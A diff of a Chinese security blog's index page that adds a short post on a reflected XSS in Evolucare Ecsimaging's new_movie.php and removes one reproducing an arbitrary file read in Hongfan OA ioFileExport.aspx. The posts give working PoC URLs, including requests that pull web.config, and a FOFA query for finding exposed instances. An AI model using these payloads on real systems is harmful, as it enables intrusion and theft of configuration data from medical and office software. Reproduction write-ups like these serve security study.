@@ -255,6 +255,80 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
+    <link itemprop="mainEntityOfPage" href="https://wanheiqiyihu.top/2023/02/13/Evolucare-Ecsimaging-new-movie-php%E5%8F%8D%E5%B0%84%E6%80%A7xss/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="十三">
+      <meta itemprop="description" content="潜心学习，不骄不躁">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="十三の博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/02/13/Evolucare-Ecsimaging-new-movie-php%E5%8F%8D%E5%B0%84%E6%80%A7xss/" class="post-title-link" itemprop="url">Evolucare Ecsimaging new_movie.php反射性xss</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2023-02-13 16:59:41 / 修改时间：17:00:15" itemprop="dateCreated datePublished" datetime="2023-02-13T16:59:41+08:00">2023-02-13</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/fuxian/" itemprop="url" rel="index"><span itemprop="name">-fuxian</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="Evolucare-Ecsimaging-new-movie-php反射性xss"><a href="#Evolucare-Ecsimaging-new-movie-php反射性xss" class="headerlink" title="Evolucare Ecsimaging new_movie.php反射性xss"></a>Evolucare Ecsimaging new_movie.php反射性xss</h1><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>EVOLUCARE ECSimage是一款国外使用的医疗管理系统，研究发现其new_movie.php接口中存在反射性xss，其源码中直接echo了输入的参数，攻击者可以通过此行为窃取系统用户中的cookie信息等。</p>
+<h2 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EVOLUCARE Evolucare Ecsimaging 版本&lt; 6.21.5</span><br></pre></td></tr></table></figure>
+
+<h2 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a>漏洞详情</h2><p>poc</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/new_movie.php?studyUID=1&amp;start=&lt;script&gt;alert(`xss`)&lt;/script&gt;&amp;end=2&amp;file=1</span><br></pre></td></tr></table></figure>
+
+<h2 id="演示截图"><a href="#演示截图" class="headerlink" title="演示截图"></a>演示截图</h2><p><img src="/2023/02/13/Evolucare-Ecsimaging-new-movie-php%E5%8F%8D%E5%B0%84%E6%80%A7xss/image-20230213165854226.png" alt="image-20230213165854226"></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
     <link itemprop="mainEntityOfPage" href="https://wanheiqiyihu.top/2023/02/12/%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB-EHole/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -553,85 +627,10 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
-    <link itemprop="mainEntityOfPage" href="https://wanheiqiyihu.top/2023/02/04/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E3%80%91-%E7%BA%A2%E5%B8%86OA-ioFileExport-aspx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="十三">
-      <meta itemprop="description" content="潜心学习，不骄不躁">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="十三の博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/02/04/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E3%80%91-%E7%BA%A2%E5%B8%86OA-ioFileExport-aspx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" class="post-title-link" itemprop="url">【漏洞复现】 红帆OA ioFileExport.aspx 任意文件读取漏洞</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2023-02-04 00:40:44 / 修改时间：00:43:55" itemprop="dateCreated datePublished" datetime="2023-02-04T00:40:44+08:00">2023-02-04</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/fuxian/" itemprop="url" rel="index"><span itemprop="name">-fuxian</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="【漏洞复现】-红帆OA-ioFileExport-aspx-任意文件读取漏洞"><a href="#【漏洞复现】-红帆OA-ioFileExport-aspx-任意文件读取漏洞" class="headerlink" title="【漏洞复现】 红帆OA ioFileExport.aspx 任意文件读取漏洞"></a>【漏洞复现】 红帆OA ioFileExport.aspx 任意文件读取漏洞</h1><p>现在写漏洞复现也加个标签好了，漏洞原理也加标签，以后便于分辨。但是还是那句话，心情不好来搞网安就对了。今天随便找个漏洞来进行浮现，漏洞原理我就不深究了，主要是体验一下拿到漏洞的那种快感。</p>
-<h2 id="fofa语句"><a href="#fofa语句" class="headerlink" title="fofa语句"></a>fofa语句</h2><p><code>fofa：app=&quot;红帆-ioffice&quot;</code></p>
-<h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><p>执行POC得到配置文件、源码等信息</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/ioffice/prg/set/iocom/ioFileExport.aspx?url=/ioffice/web.config&amp;filename=test.txt&amp;ContentType=application/octet-stream</span><br><span class="line"></span><br><span class="line">/ioffice/prg/set/iocom/ioFileExport.aspx?url=/ioffice/Login.aspx&amp;filename=test.txt&amp;ContentType=application/octet-stream</span><br></pre></td></tr></table></figure>
-
-<p>复现成功</p>
-<p><img src="/2023/02/04/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E3%80%91-%E7%BA%A2%E5%B8%86OA-ioFileExport-aspx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/image-20230204002138895.png" alt="image-20230204002138895"></p>
-<p>（后面倒是可以来看看）</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/page/20/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/20/">20</a><span class="page-number current">21</span><a class="page-number" href="/page/22/">22</a><span class="space">&hellip;</span><a class="page-number" href="/page/58/">58</a><a class="extend next" rel="next" href="/page/22/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
+    <a class="extend prev" rel="prev" href="/page/20/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/20/">20</a><span class="page-number current">21</span><a class="page-number" href="/page/22/">22</a><span class="space">&hellip;</span><a class="page-number" href="/page/59/">59</a><a class="extend next" rel="next" href="/page/22/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
   </nav>
 
 
@@ -699,7 +698,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">174</span>
+          <span class="site-state-item-count">175</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
